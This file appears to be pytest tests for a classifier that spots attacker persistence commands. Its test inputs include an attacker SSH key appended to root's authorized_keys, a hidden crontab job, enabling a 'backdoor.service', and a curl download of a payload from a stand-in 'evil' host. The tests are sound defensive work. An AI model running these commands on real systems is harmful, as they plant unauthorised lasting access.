"""Tests for the Stage 10 slice 1 :class:`PersistenceClassifier`.

Slice 10.1 ships the regex-only hot path; the LLM pass arrives in
slice 10.3. These tests pin the classifier's pre-LLM contract:
regex match -> :class:`PersistenceEvent`, miss -> :data:`None`,
constructor validates ``budget_cap_tokens``.
"""

from __future__ import annotations

import pytest

from anglerfish.persistence import PersistenceClassifier


async def test_classify_returns_event_on_authorized_keys_install() -> None:
    classifier = PersistenceClassifier(client=None)
    command = "echo 'ssh-ed25519 AAAA attacker' >> /root/.ssh/authorized_keys"
    event = await classifier.classify(command, cwd="/root")
    assert event is not None
    assert event.kind == "authorized_keys"
    assert event.source == "regex"


async def test_classify_returns_event_on_crontab_install() -> None:
    classifier = PersistenceClassifier(client=None)
    event = await classifier.classify(
        "echo '0 * * * * /tmp/.x' | crontab -",
        cwd="/root",
    )
    assert event is not None
    assert event.kind == "crontab"
    assert event.payload == "0 * * * * /tmp/.x"


async def test_classify_returns_event_on_systemctl_install() -> None:
    classifier = PersistenceClassifier(client=None)
    event = await classifier.classify(
        "systemctl enable backdoor.service",
        cwd="/root",
    )
    assert event is not None
    assert event.kind == "systemctl"
    assert event.sub_key == "backdoor"


async def test_classify_returns_none_on_unrelated_command() -> None:
    classifier = PersistenceClassifier(client=None)
    assert await classifier.classify("ls -la /etc", cwd="/root") is None
    assert await classifier.classify("cat /etc/passwd", cwd="/root") is None


async def test_classify_returns_none_on_empty_command() -> None:
    classifier = PersistenceClassifier(client=None)
    assert await classifier.classify("", cwd="/root") is None


async def test_classify_does_not_call_llm_when_regex_matches() -> None:
    """A regex hit must short-circuit before any LLM logic runs.

    Slice 10.1 has no LLM pass yet, so this is asserted indirectly
    by passing ``client=None`` + ``llm_enabled=True``: a regex hit
    must NOT raise an AttributeError on the None client.
    """
    classifier = PersistenceClassifier(client=None, llm_enabled=True)
    event = await classifier.classify(
        "echo 'ssh-ed25519 AAAA attacker' >> ~/.ssh/authorized_keys",
        cwd="/root",
    )
    assert event is not None


def test_constructor_rejects_zero_budget_cap_tokens() -> None:
    with pytest.raises(ValueError, match="budget_cap_tokens"):
        PersistenceClassifier(client=None, budget_cap_tokens=0)


def test_constructor_accepts_llm_enabled_false() -> None:
    """Operator-disabled LLM pass is a supported construction."""
    classifier = PersistenceClassifier(client=None, llm_enabled=False)
    # No assertion: this test pins that construction succeeds.
    assert classifier is not None


async def test_classify_returns_none_on_regex_silent_command_today() -> None:
    """Slice 10.1: regex-silent command returns None (no LLM pass yet).

    Slice 10.3 will change this: a write-shape regex miss will
    trigger the LLM classifier. This test pins the slice 10.1
    behaviour explicitly so the slice 10.3 commit knows what it
    is changing.
    """
    classifier = PersistenceClassifier(client=None)
    # Curl + chmod is a classic regex-silent persistence shape
    # (downloads a payload + makes it executable) - slice 10.3
    # would catch this via LLM; slice 10.1 returns None.
    event = await classifier.classify(
        "curl http://evil/x -o /tmp/.x && chmod +x /tmp/.x",
        cwd="/root",
    )
    assert event is None
